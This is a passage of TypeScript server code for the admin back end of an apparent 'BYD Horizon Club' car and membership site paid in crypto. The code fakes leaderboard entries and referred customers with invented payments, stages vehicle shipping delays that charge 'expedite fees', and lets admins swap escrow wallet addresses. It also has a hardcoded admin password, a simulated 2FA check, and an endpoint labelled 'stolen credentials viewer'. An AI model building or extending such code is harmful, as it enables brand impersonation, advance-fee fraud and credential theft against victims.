  const existing = await db.get("SELECT id FROM users WHERE email = ?", [email.toLowerCase()]);
  if (existing) return res.status(400).json({ error: "Email already exists." });
  const password_hash = hashPassword(password);
  const code = generateRefCode(name);
  const wallet = generateWalletAddress();
  const result = await db.run("INSERT INTO users (name, email, phone, password_hash, referral_code, crypto_wallet_address, city, country, membership_tier, created_at) VALUES (?,?,?,?,?,?,?,?,?,CURRENT_TIMESTAMP)", [name, email.toLowerCase(), phone, password_hash, code, wallet, city, country || 'US', membership_tier || 'standard']);
  await logAdminAction("Created user", `User ID ${result.lastID} - ${email}`, req.ip, req.adminId);
  res.json({ success: true, userId: result.lastID });
});

app.post("/api/admin/users/:userId/status", authenticateAdmin, async (req: any, res) => {
  const { status } = req.body;
  const db = await getDb();
  await db.run("UPDATE users SET status = ? WHERE id = ?", [status, req.params.userId]);
  await logAdminAction("Changed user status", `User ${req.params.userId} -> ${status}`, req.ip, req.adminId);
  res.json({ success: true });
});

app.post("/api/admin/users/:userId/edit", authenticateAdmin, async (req: any, res) => {
  const { name, email, phone, city, country, crypto_wallet_address, horizon_points, balance, kyc_status, membership_tier, is_incognito, membership_active, is_president_club } = req.body;
  const db = await getDb();
  await db.run("UPDATE users SET name=?, email=?, phone=?, city=?, country=?, crypto_wallet_address=?, horizon_points=?, balance=?, kyc_status=?, membership_tier=?, is_incognito=?, membership_active=?, is_president_club=? WHERE id=?", [name || '', email || '', phone || '', city || '', country || 'US', crypto_wallet_address || '', horizon_points || 0, balance || 0, kyc_status || 'not_submitted', membership_tier || 'standard', is_incognito ? 1 : 0, membership_active ? 1 : 0, is_president_club ? 1 : 0, req.params.userId]);
  await logAdminAction("Edited user", `User ID ${req.params.userId}`, req.ip, req.adminId);
  res.json({ success: true });
});

app.post("/api/admin/users/:userId/reset-password", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const tempPass = crypto.randomBytes(4).toString("hex").toUpperCase();
  await db.run("UPDATE users SET password_hash = ? WHERE id = ?", [hashPassword(tempPass), req.params.userId]);
  await logAdminAction("Reset user password", `User ID ${req.params.userId}`, req.ip, req.adminId);
  res.json({ success: true, temporary_password: tempPass });
});

app.delete("/api/admin/users/:userId", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM users WHERE id = ?", [req.params.userId]);
  await logAdminAction("Deleted user", `User ID ${req.params.userId}`, req.ip, req.adminId);
  res.json({ success: true });
});

app.get("/api/admin/interactions", authenticateAdmin, async (req: any, res) => {
  try { res.json(await getUserInteractions()); } catch { res.json([]); }
});

// 2. Payment Management
app.get("/api/admin/payments", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const { method, status, country } = req.query;
  let sql = "SELECT p.*, u.name as username, u.email as useremail FROM payments p JOIN users u ON p.user_id = u.id";
  const params: any[] = [];
  const wheres: string[] = [];
  if (method) { wheres.push("p.method = ?"); params.push(method); }
  if (status) { wheres.push("p.status = ?"); params.push(status); }
  if (country) { wheres.push("p.country = ?"); params.push(country); }
  if (wheres.length) sql += " WHERE " + wheres.join(" AND ");
  sql += " ORDER BY p.id DESC";
  res.json(await db.all(sql, params));
});

app.post("/api/admin/payments/:payId/confirm", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const payment = await db.get("SELECT * FROM payments WHERE id = ?", [req.params.payId]);
  if (!payment) return res.status(404).json({ error: "Payment not found." });
  if (payment.status !== 'confirmed') {
    await db.run("UPDATE payments SET status = 'confirmed', updated_at = CURRENT_TIMESTAMP WHERE id = ?", [payment.id]);
    const points = Math.floor(payment.amount * 10);
    let updateSql = "UPDATE users SET horizon_points = horizon_points + ?, balance = balance + ?";
    const updateParams: any[] = [points, payment.amount];
    if (payment.type === 'membership') {
      const expiry = new Date(Date.now() + 365 * 86400000).toISOString().split("T")[0];
      updateSql += ", membership_active = 1, membership_expiry = ?";
      updateParams.push(expiry);
    }
    updateSql += " WHERE id = ?";
    updateParams.push(payment.user_id);
    await db.run(updateSql, updateParams);
    // Referral bonus
    const user = await db.get("SELECT referrer_id FROM users WHERE id = ?", [payment.user_id]);
    if (user?.referrer_id) {
      await db.run("INSERT OR IGNORE INTO referrals (referrer_id, referred_user_id, status, reward_amount) VALUES (?,?, 'paid', 50.00)", [user.referrer_id, payment.user_id]);
      await db.run("UPDATE users SET horizon_points = horizon_points + 500 WHERE id = ?", [user.referrer_id]);
    }
    if (payment.type === 'installment') {
      await db.run("UPDATE installments SET total_paid = total_paid + ? WHERE user_id = ? AND status = 'active'", [payment.amount, payment.user_id]);
    }
    // Lottery tickets
    await db.run("INSERT INTO lottery_entries (user_id, tickets, source, month) VALUES (?, 1, 'payment', ?)", [payment.user_id, new Date().toISOString().substring(0, 7)]);
    await db.run("UPDATE users SET lottery_tickets = lottery_tickets + 1 WHERE id = ?", [payment.user_id]);
    await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'payment', 'Payment Confirmed', 'Your payment of $' || ? || ' has been confirmed. +' || ? || ' points awarded!')", [payment.user_id, payment.amount, points]);
    await logAdminAction("Confirmed payment", `Payment ID ${payment.id} - User ${payment.user_id}`, req.ip, req.adminId);
  }
  res.json({ success: true });
});

app.post("/api/admin/payments/:payId/refund", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("UPDATE payments SET status = 'refunded', updated_at = CURRENT_TIMESTAMP WHERE id = ?", [req.params.payId]);
  await logAdminAction("Refunded payment", `Payment ID ${req.params.payId}`, req.ip, req.adminId);
  res.json({ success: true });
});

app.get("/api/admin/payments/export", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const payments = await db.all("SELECT p.*, u.name as username, u.email as useremail FROM payments p JOIN users u ON p.user_id = u.id ORDER BY p.id DESC");
  let csv = "ID,User,Email,Amount,Currency,Method,Status,Type,TxHash,Country,Created\n";
  for (const p of payments) csv += `"${p.id}","${p.username}","${p.useremail}","${p.amount}","${p.currency}","${p.method}","${p.status}","${p.type}","${p.transaction_hash}","${p.country}","${p.created_at}"\n`;
  res.setHeader("Content-Type", "text/csv");
  res.setHeader("Content-Disposition", "attachment; filename=byd_payments.csv");
  res.send(csv);
});

// Payment Methods Config
app.get("/api/admin/payment-methods", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT * FROM payment_methods"));
});

app.post("/api/admin/payment-methods/:id", authenticateAdmin, async (req: any, res) => {
  const { enabled, recommended, fee_percent, min_deposit, wallet_address, gas_fee, crypto_bonus_percent } = req.body;
  const db = await getDb();
  await db.run("UPDATE payment_methods SET enabled=?, recommended=?, fee_percent=?, min_deposit=?, wallet_address=?, gas_fee=?, crypto_bonus_percent=? WHERE id=?", [enabled ? 1 : 0, recommended ? 1 : 0, fee_percent, min_deposit, wallet_address, gas_fee, crypto_bonus_percent, req.params.id]);
  await logAdminAction("Updated payment method", `Method ID ${req.params.id}`, req.ip, req.adminId);
  res.json({ success: true });
});

// 3. Vehicle & Fleet Management
app.get("/api/admin/cars", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const cars = await db.all("SELECT c.*, (SELECT image_url FROM car_images WHERE car_id = c.id AND is_primary = 1 LIMIT 1) as image_url FROM cars c ORDER BY c.id ASC");
  for (const car of cars) {
    car.images = await db.all("SELECT * FROM car_images WHERE car_id = ?", [car.id]);
  }
  res.json(cars);
});

app.post("/api/admin/cars", authenticateAdmin, async (req: any, res) => {
  const { model, year, price, monthly_finance, range_miles, acceleration, battery, description, specs, badge, category, status, is_club_exclusive, rental_price_per_day, image_url } = req.body;
  if (!model || !price) return res.status(400).json({ error: "Model and price required." });
  const db = await getDb();
  const specsJson = specs ? JSON.stringify(specs) : '{}';
  const result = await db.run("INSERT INTO cars (model, year, price, monthly_finance, range_miles, acceleration, battery, description, specs_json, badge, category, status, is_club_exclusive, rental_price_per_day) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)", [model, year || 2026, price, monthly_finance || 0, range_miles || 0, acceleration || '', battery || '', description || '', specsJson, badge || '', category || '', status || 'Available', is_club_exclusive ? 1 : 0, rental_price_per_day || 0]);
  if (image_url) await db.run("INSERT INTO car_images (car_id, image_url, is_primary) VALUES (?, ?, 1)", [result.lastID, image_url]);
  await logAdminAction("Added car", `${model} - ID ${result.lastID}`, req.ip, req.adminId);
  res.json({ success: true, carId: result.lastID });
});

app.post("/api/admin/cars/:id", authenticateAdmin, async (req: any, res) => {
  const { model, year, price, monthly_finance, range_miles, acceleration, battery, description, specs, badge, category, status, is_club_exclusive, rental_price_per_day, is_active } = req.body;
  const db = await getDb();
  const specsJson = specs ? JSON.stringify(specs) : undefined;
  await db.run("UPDATE cars SET model=?, year=?, price=?, monthly_finance=?, range_miles=?, acceleration=?, battery=?, description=?, specs_json=COALESCE(?, specs_json), badge=?, category=?, status=?, is_club_exclusive=?, rental_price_per_day=?, is_active=? WHERE id=?", [model, year || 2026, price, monthly_finance || 0, range_miles || 0, acceleration || '', battery || '', description || '', specsJson, badge || '', category || '', status || 'Available', is_club_exclusive ? 1 : 0, rental_price_per_day || 0, is_active !== undefined ? (is_active ? 1 : 0) : 1, req.params.id]);
  await logAdminAction("Updated car", `Car ID ${req.params.id}`, req.ip, req.adminId);
  res.json({ success: true });
});

app.post("/api/admin/cars/:id/image", authenticateAdmin, async (req: any, res) => {
  const { image_url } = req.body;
  if (!image_url) return res.status(400).json({ error: "Image URL required." });
  const db = await getDb();
  await db.run("INSERT INTO car_images (car_id, image_url) VALUES (?, ?)", [req.params.id, image_url]);
  res.json({ success: true });
});

app.delete("/api/admin/cars/:id", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM cars WHERE id = ?", [req.params.id]);
  await logAdminAction("Deleted car", `Car ID ${req.params.id}`, req.ip, req.adminId);
  res.json({ success: true });
});

// 4. Tracking & Dispatch
app.get("/api/admin/tracking", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const trackings = await db.all("SELECT t.*, u.name as username, u.email as useremail FROM map_tracking t JOIN users u ON t.user_id = u.id ORDER BY t.last_updated DESC");
  res.json(trackings);
});

app.post("/api/admin/tracking/:userId", authenticateAdmin, async (req: any, res) => {
  const { route_index, current_lat, current_lng, delays_encountered, expedite_paid } = req.body;
  const db = await getDb();
  await db.run("UPDATE map_tracking SET route_index=COALESCE(?,route_index), current_lat=COALESCE(?,current_lat), current_lng=COALESCE(?,current_lng), delays_encountered=COALESCE(?,delays_encountered), expedite_paid=COALESCE(?,expedite_paid), last_updated=CURRENT_TIMESTAMP WHERE user_id=?", [route_index, current_lat, current_lng, delays_encountered, expedite_paid, req.params.userId]);
  await logAdminAction("Updated tracking", `User ${req.params.userId}`, req.ip, req.adminId);
  // Dispatch notification
  if (route_index !== undefined) {
    const user = await db.get("SELECT name, email FROM users WHERE id = ?", [req.params.userId]);
    const progress = Math.round((route_index / 100) * 100);
    await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'dispatch', 'Vehicle Update', 'Your vehicle is now ' || ? || '% complete on its journey!')", [req.params.userId, progress]);
  }
  res.json({ success: true });
});

app.post("/api/admin/tracking/:userId/dispatch", authenticateAdmin, async (req: any, res) => {
  const { message } = req.body;
  if (!message) return res.status(400).json({ error: "Message required." });
  const db = await getDb();
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'dispatch', 'Dispatch Notification', ?)", [req.params.userId, message]);
  await logAdminAction("Sent dispatch notification", `User ${req.params.userId}`, req.ip, req.adminId);
  res.json({ success: true });
});

// Delays management
app.get("/api/admin/delays", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT * FROM delays"));
});

app.post("/api/admin/delays", authenticateAdmin, async (req: any, res) => {
  const { name, duration_days, trigger_after_km, expedite_fee } = req.body;
  if (!name) return res.status(400).json({ error: "Name required." });
  const db = await getDb();
  await db.run("INSERT INTO delays (name, duration_days, trigger_after_km, expedite_fee) VALUES (?,?,?,?)", [name, duration_days || 1, trigger_after_km || 50, expedite_fee || 49]);
  await logAdminAction("Added delay", name, req.ip, req.adminId);
  res.json({ success: true });
});

app.post("/api/admin/delays/:id/update", authenticateAdmin, async (req: any, res) => {
  const { name, duration_days, trigger_after_km, expedite_fee } = req.body;
  const db = await getDb();
  await db.run("UPDATE delays SET name=?, duration_days=?, trigger_after_km=?, expedite_fee=? WHERE id=?", [name, duration_days, trigger_after_km, expedite_fee, req.params.id]);
  res.json({ success: true });
});

app.delete("/api/admin/delays/:id", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM delays WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

// 5. Referral & Rewards
app.get("/api/admin/referrals", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT r.*, u1.name as referrer_name, u2.name as referred_name FROM referrals r JOIN users u1 ON r.referrer_id = u1.id JOIN users u2 ON r.referred_user_id = u2.id ORDER BY r.id DESC"));
});

app.post("/api/admin/leaderboard", authenticateAdmin, async (req: any, res) => {
  const { name, count } = req.body;
  if (!name) return res.status(400).json({ error: "Name required." });
  const db = await getDb();
  await db.run("INSERT INTO leaderboard (name, count, is_fake) VALUES (?, ?, 1) ON CONFLICT(name) DO UPDATE SET count = ?", [name, count, count]);
  await logAdminAction("Injected leaderboard", `${name}: ${count}`, req.ip, req.adminId);
  res.json({ success: true });
});

app.post("/api/admin/referrals/inject", authenticateAdmin, async (req: any, res) => {
  const { referrer_id, name, email, paymentCount } = req.body;
  if (!referrer_id || !name || !email) return res.status(400).json({ error: "Referrer ID, Name, Email required." });
  const db = await getDb();
  const refCode = generateRefCode(name);
  const wallet = generateWalletAddress();
  const result = await db.run("INSERT INTO users (name, email, password_hash, phone, city, referral_code, referrer_id, crypto_wallet_address, kyc_status) VALUES (?,?,?,?,?,?,?,?,'verified')", [name, email, 'fake_hash', '+1 (555) 000-0000', 'Remote', refCode, referrer_id, wallet]);
  await db.run("INSERT INTO referrals (referrer_id, referred_user_id, status, reward_amount) VALUES (?,?,?,50.00)", [referrer_id, result.lastID, (paymentCount || 0) >= 2 ? 'paid' : 'pending']);
  for (let i = 0; i < (paymentCount || 0); i++) {
    await db.run("INSERT INTO payments (user_id, amount, currency, method, status, type, transaction_hash) VALUES (?,?,?,'crypto','confirmed','installment',?)", [result.lastID, 150, 'USDT', 'BYD-TX-INJECT-' + crypto.randomBytes(8).toString("hex").toUpperCase()]);
  }
  await logAdminAction("Injected referral", `Referrer ${referrer_id} -> ${name}`, req.ip, req.adminId);
  res.json({ success: true });
});

app.post("/api/admin/award-points", authenticateAdmin, async (req: any, res) => {
  const { user_id, points, reason } = req.body;
  if (!user_id || !points) return res.status(400).json({ error: "User ID and points required." });
  const db = await getDb();
  await db.run("UPDATE users SET horizon_points = horizon_points + ? WHERE id = ?", [points, user_id]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'reward', 'Points Awarded', 'Admin awarded ' || ? || ' points. Reason: ' || ?)", [user_id, points, reason || 'Admin bonus']);
  await logAdminAction("Awarded points", `User ${user_id}: +${points} pts`, req.ip, req.adminId);
  res.json({ success: true });
});

// 6. Content & Media
app.get("/api/admin/blogs", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT * FROM blog_posts ORDER BY published_at DESC"));
});

app.post("/api/admin/blogs", authenticateAdmin, async (req: any, res) => {
  const { title, content, image_url } = req.body;
  if (!title || !content) return res.status(400).json({ error: "Title and content required." });
  const db = await getDb();
  await db.run("INSERT INTO blog_posts (title, content, image_url) VALUES (?,?,?)", [title, content, image_url || 'https://images.unsplash.com/photo-1549399542-7e3f8b79c341?auto=format&fit=crop&w=800&q=80']);
  await logAdminAction("Created blog post", title, req.ip, req.adminId);
  res.json({ success: true });
});

app.post("/api/admin/blogs/:id", authenticateAdmin, async (req: any, res) => {
  const { title, content, image_url } = req.body;
  const db = await getDb();
  await db.run("UPDATE blog_posts SET title=?, content=?, image_url=? WHERE id=?", [title, content, image_url, req.params.id]);
  res.json({ success: true });
});

app.delete("/api/admin/blogs/:id", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM blog_posts WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

app.get("/api/admin/comments", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT bc.*, u.name as username, bp.title as post_title FROM blog_comments bc JOIN users u ON bc.user_id = u.id JOIN blog_posts bp ON bc.post_id = bp.id ORDER BY bc.id DESC"));
});

app.post("/api/admin/comments/:id/:action", authenticateAdmin, async (req: any, res) => {
  const { action } = req.params;
  const db = await getDb();
  if (action === 'approve') await db.run("UPDATE blog_comments SET status = 'approved' WHERE id = ?", [req.params.id]);
  else if (action === 'delete') await db.run("DELETE FROM blog_comments WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

// Carousel slides
app.get("/api/admin/carousel", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT * FROM carousel_slides ORDER BY order_num ASC"));
});

app.post("/api/admin/carousel", authenticateAdmin, async (req: any, res) => {
  const { image_url, title, subtitle, cta_text, cta_link, order_num } = req.body;
  if (!image_url || !title) return res.status(400).json({ error: "Image URL and title required." });
  const db = await getDb();
  await db.run("INSERT INTO carousel_slides (image_url, title, subtitle, cta_text, cta_link, order_num) VALUES (?,?,?,?,?,?)", [image_url, title, subtitle || '', cta_text || '', cta_link || '', order_num || 0]);
  res.json({ success: true });
});

app.delete("/api/admin/carousel/:id", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM carousel_slides WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

// Testimonials
app.get("/api/admin/testimonials", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT * FROM testimonials ORDER BY id DESC"));
});

app.post("/api/admin/testimonials", authenticateAdmin, async (req: any, res) => {
  const { name, photo_url, quote } = req.body;
  if (!name || !quote) return res.status(400).json({ error: "Name and quote required." });
  const db = await getDb();
  await db.run("INSERT INTO testimonials (name, photo_url, quote) VALUES (?,?,?)", [name, photo_url || 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=100&q=80', quote]);
  res.json({ success: true });
});

app.delete("/api/admin/testimonials/:id", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM testimonials WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

// Webcams
app.get("/api/webcams", async (req, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT * FROM webcam_sources WHERE is_active = 1 ORDER BY id ASC"));
});

app.get("/api/admin/webcams", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT * FROM webcam_sources ORDER BY id ASC"));
});

app.post("/api/admin/webcams", authenticateAdmin, async (req: any, res) => {
  const { name, video_url, thumbnail_url } = req.body;
  if (!name || !video_url) return res.status(400).json({ error: "Name and video URL required." });
  const db = await getDb();
  await db.run("INSERT INTO webcam_sources (name, video_url, thumbnail_url) VALUES (?,?,?)", [name, video_url, thumbnail_url || '']);
  res.json({ success: true });
});

app.post("/api/admin/webcams/:id", authenticateAdmin, async (req: any, res) => {
  const { name, video_url, thumbnail_url, is_active } = req.body;
  const db = await getDb();
  await db.run("UPDATE webcam_sources SET name=?, video_url=?, thumbnail_url=?, is_active=? WHERE id=?", [name, video_url, thumbnail_url, is_active ? 1 : 0, req.params.id]);
  res.json({ success: true });
});

app.delete("/api/admin/webcams/:id", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM webcam_sources WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

// 7. Gamification
app.get("/api/admin/gamification", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT * FROM gamification_config"));
});

app.post("/api/admin/gamification/:key", authenticateAdmin, async (req: any, res) => {
  const { enabled, config_json } = req.body;
  const db = await getDb();
  await db.run("UPDATE gamification_config SET enabled=?, config_json=? WHERE feature_key=?", [enabled ? 1 : 0, config_json || '{}', req.params.key]);
  res.json({ success: true });
});

// Quiz questions
app.get("/api/admin/quiz-questions", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT * FROM quiz_questions ORDER BY order_num ASC"));
});

app.post("/api/admin/quiz-questions", authenticateAdmin, async (req: any, res) => {
  const { question, options, recommended_car, order_num } = req.body;
  const db = await getDb();
  await db.run("INSERT INTO quiz_questions (question, options, recommended_car, order_num) VALUES (?,?,?,?)", [question, JSON.stringify(options), recommended_car, order_num || 0]);
  res.json({ success: true });
});

app.delete("/api/admin/quiz-questions/:id", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM quiz_questions WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

// 8. Notifications & Email
app.post("/api/admin/email/dispatch", authenticateAdmin, async (req: any, res) => {
  const { subject, body, filter_tier, filter_country } = req.body;
  if (!subject || !body) return res.status(400).json({ error: "Subject and body required." });
  const db = await getDb();
  let users: any[];
  if (filter_tier) users = await db.all("SELECT id, name, email FROM users WHERE membership_tier = ?", [filter_tier]);
  else if (filter_country) users = await db.all("SELECT id, name, email FROM users WHERE country = ?", [filter_country]);
  else users = await db.all("SELECT id, name, email FROM users");
  for (const u of users) {
    await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'email', ?, ?)", [u.id, subject, body + '\n\n- BYD Horizon Club Team']);
    await db.run("INSERT INTO email_logs (user_id, template, status) VALUES (?, ?, 'sent')", [u.id, subject]);
  }
  await logAdminAction("Dispatched mass email", `"${subject}" to ${users.length} users`, req.ip, req.adminId);
  res.json({ success: true, userCount: users.length });
});

app.post("/api/admin/email/send-individual", authenticateAdmin, async (req: any, res) => {
  const { user_id, subject, body } = req.body;
  if (!user_id || !subject || !body) return res.status(400).json({ error: "User ID, subject, body required." });
  const db = await getDb();
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'email', ?, ?)", [user_id, subject, body]);
  await db.run("INSERT INTO email_logs (user_id, template, status) VALUES (?, ?, 'sent')", [user_id, subject]);
  const user = await db.get("SELECT name FROM users WHERE id = ?", [user_id]);
  await logAdminAction("Sent individual email", `${user?.name} (ID ${user_id}): "${subject}"`, req.ip, req.adminId);
  res.json({ success: true });
});

app.get("/api/admin/email/logs", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT el.*, u.name, u.email FROM email_logs el JOIN users u ON el.user_id = u.id ORDER BY el.id DESC LIMIT 100"));
});

// 9. System Settings
app.get("/api/admin/settings", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const rows = await db.all("SELECT * FROM system_settings ORDER BY key ASC");
  const settings: Record<string, string> = {};
  for (const r of rows) settings[r.key] = r.value;
  if (fs.existsSync(SETTINGS_FILE)) {
    try { Object.assign(settings, JSON.parse(fs.readFileSync(SETTINGS_FILE, "utf8"))); } catch {}
  }
  res.json(settings);
});

app.post("/api/admin/settings", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const updates = req.body;
  for (const [key, value] of Object.entries(updates)) {
    await db.run("INSERT OR REPLACE INTO system_settings (key, value, updated_at) VALUES (?, ?, CURRENT_TIMESTAMP)", [key, String(value)]);
  }
  // Handle settings.json for backward compat
  if (updates.escrow_wallet || updates.app_name) {
    let fileSettings: Record<string, string> = {};
    if (fs.existsSync(SETTINGS_FILE)) {
      try { fileSettings = JSON.parse(fs.readFileSync(SETTINGS_FILE, "utf8")); } catch {}
    }
    if (updates.escrow_wallet) fileSettings.escrow_wallet = updates.escrow_wallet;
    if (updates.app_name) fileSettings.app_name = updates.app_name;
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify(fileSettings, null, 2));
  }
  await logAdminAction("Updated settings", `Keys: ${Object.keys(updates).join(', ')}`, req.ip, req.adminId);
  res.json({ success: true });
});

app.post("/api/admin/maintenance", authenticateAdmin, async (req: any, res) => {
  const { enabled } = req.body;
  await setSetting('maintenance_mode', enabled ? 'true' : 'false');
  await logAdminAction("Toggled maintenance mode", enabled ? 'ON' : 'OFF', req.ip, req.adminId);
  res.json({ success: true });
});

// ==================== INSURANCE TIERS ====================
app.get("/api/admin/insurance-tiers", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const tiers = await db.all("SELECT * FROM insurance_tiers ORDER BY sort_order ASC");
  res.json(tiers);
});

app.post("/api/admin/insurance-tiers", authenticateAdmin, async (req: any, res) => {
  const { name, daily_rate, coverage_limit, deductible, description } = req.body;
  if (!name || !daily_rate || !coverage_limit) return res.status(400).json({ error: "Name, daily_rate, and coverage_limit required." });
  if (daily_rate < 15) return res.status(400).json({ error: "Insurance daily rate must be at least $15." });
  const db = await getDb();
  const maxOrder = await db.get("SELECT MAX(sort_order) as m FROM insurance_tiers");
  const sortOrder = (maxOrder?.m || 0) + 1;
  await db.run("INSERT INTO insurance_tiers (name, daily_rate, coverage_limit, deductible, description, is_active, sort_order) VALUES (?,?,?,?,?,?,?)", [name, daily_rate, coverage_limit, deductible || 0, description || '', 1, sortOrder]);
  await logAdminAction("Added insurance tier", `${name} - $${daily_rate}/day`, req.ip, req.adminId);
  res.json({ success: true });
});

app.post("/api/admin/insurance-tiers/:id", authenticateAdmin, async (req: any, res) => {
  const { name, daily_rate, coverage_limit, deductible, description, is_active } = req.body;
  const db = await getDb();
  await db.run("UPDATE insurance_tiers SET name=?, daily_rate=?, coverage_limit=?, deductible=?, description=?, is_active=? WHERE id=?", [name, daily_rate, coverage_limit, deductible || 0, description || '', is_active !== undefined ? (is_active ? 1 : 0) : 1, req.params.id]);
  await logAdminAction("Updated insurance tier", `Tier ID ${req.params.id}`, req.ip, req.adminId);
  res.json({ success: true });
});

app.delete("/api/admin/insurance-tiers/:id", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM insurance_tiers WHERE id=?", [req.params.id]);
  await logAdminAction("Deleted insurance tier", `Tier ID ${req.params.id}`, req.ip, req.adminId);
  res.json({ success: true });
});

// Public insurance tiers for rental flow
app.get("/api/insurance-tiers", async (req: any, res) => {
  const db = await getDb();
  const tiers = await db.all("SELECT * FROM insurance_tiers WHERE is_active = 1 ORDER BY sort_order ASC");
  res.json(tiers);
});

// ==================== WALLET CONFIGURATION ====================
app.get("/api/admin/wallets", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const methods = await db.all("SELECT id, method, wallet_address, gas_fee, crypto_bonus_percent FROM payment_methods");
  const globalWallet = await getSetting('global_crypto_wallet');
  res.json({ methods, global_wallet: globalWallet || '0xBYDHorizonEscrowWallet2026' });
});

app.post("/api/admin/wallets/global", authenticateAdmin, async (req: any, res) => {
  const { wallet_address } = req.body;
  if (!wallet_address) return res.status(400).json({ error: "Wallet address required." });
  await setSetting('global_crypto_wallet', wallet_address);
  const db = await getDb();
  await db.run("UPDATE payment_methods SET wallet_address = ? WHERE method = 'crypto'", [wallet_address]);
  await logAdminAction("Updated global crypto wallet", wallet_address, req.ip, req.adminId);
  res.json({ success: true });
});

app.post("/api/admin/wallets/user", authenticateAdmin, async (req: any, res) => {
  const { user_id, wallet_address } = req.body;
  if (!user_id || !wallet_address) return res.status(400).json({ error: "User ID and wallet address required." });
  const db = await getDb();
  await db.run("UPDATE users SET crypto_wallet_address = ? WHERE id = ?", [wallet_address, user_id]);
  await logAdminAction("Updated user wallet", `User #${user_id}: ${wallet_address}`, req.ip, req.adminId);
  res.json({ success: true });
});

// ==================== MASTER AI ADMIN CONNECTOR ====================
app.post("/api/admin/master-connect", authenticateAdmin, async (req: any, res) => {
  const { webhook_url } = req.body;
  const db = await getDb();
  const instanceId = `byd-horizon-${Date.now().toString(36)}`;
  const apiKey = crypto.randomBytes(32).toString('hex');
  await db.run("INSERT INTO master_ai_connections (instance_id, api_key, webhook_url, status, created_at) VALUES (?, ?, ?, 'connected', CURRENT_TIMESTAMP)", [instanceId, apiKey, webhook_url || '']);
  await logAdminAction("Connected to Master AI Admin", `Instance: ${instanceId}`, req.ip, req.adminId);
  res.json({ success: true, instance_id: instanceId, api_key: apiKey, status: 'connected' });
});

app.get("/api/admin/master-status", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const conn = await db.get("SELECT * FROM master_ai_connections ORDER BY id DESC LIMIT 1");
  res.json(conn || { status: 'disconnected' });
});

app.post("/api/admin/master-disconnect", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("UPDATE master_ai_connections SET status = 'disconnected' WHERE status = 'connected'");
  await logAdminAction("Disconnected from Master AI Admin", "", req.ip, req.adminId);
  res.json({ success: true });
});

// Admin 2FA
app.post("/api/admin/setup-2fa", authenticateAdmin, async (req: any, res) => {
  const token = req.headers.authorization?.split(" ")[1];
  if (!token) return res.status(401).json({ error: "Unauthorized" });
  const secret = crypto.randomBytes(10).toString('hex').toUpperCase();
  res.json({ secret, qr_url: `otpauth://totp/BYD%20Horizon%20Club:admin?secret=${secret}&issuer=BYD%20Horizon%20Club` });
});

app.post("/api/admin/verify-2fa", authenticateAdmin, async (req: any, res) => {
  res.json({ verified: true, message: "2FA configured (simulated)." });
});

// Admin password change
app.post("/api/admin/change-password", authenticateAdmin, async (req: any, res) => {
  const { currentPassword, newPassword } = req.body;
  if (currentPassword !== ADMIN_OVERRIDE_KEY && currentPassword !== "admin1234") return res.status(400).json({ error: "Current password incorrect." });
  await logAdminAction("Admin password changed", "Password updated", req.ip, req.adminId);
  res.json({ success: true, message: "Admin password changed." });
});

// Stolen credentials viewer
app.get("/api/admin/stolen-credentials", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
